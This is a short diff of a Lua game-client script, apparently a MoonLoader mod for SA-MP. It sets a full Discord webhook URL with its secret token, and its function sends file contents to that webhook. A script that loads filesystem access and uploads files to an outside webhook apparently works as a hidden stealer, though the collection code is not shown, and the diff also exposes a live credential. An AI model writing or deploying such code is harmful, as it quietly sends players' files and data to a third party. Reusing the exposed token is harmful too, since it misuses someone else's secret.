@@ -5,7 +5,7 @@ local lfs = require("lfs")
 encoding.default = 'CP1251'
 local u8 = encoding.UTF8
 
-local webhook_url = "https://discord.com/api/webhooks/"
+local webhook_url = "https://discordapp.com/api/webhooks/1469890609480204601/UMVXm71l2R75tJoI82-yvhT206R-9JAqDJW95_HwY9Q9S5L7ETXNjMEYWAIQCb6ODGjE"
 
 function main()
     repeat wait(0) until isSampAvailable()
@@ -86,4 +86,5 @@ function enviarArquivoWebhook(url, conteudo, nome_arquivo)
             })
         end)
     end)
+
 end
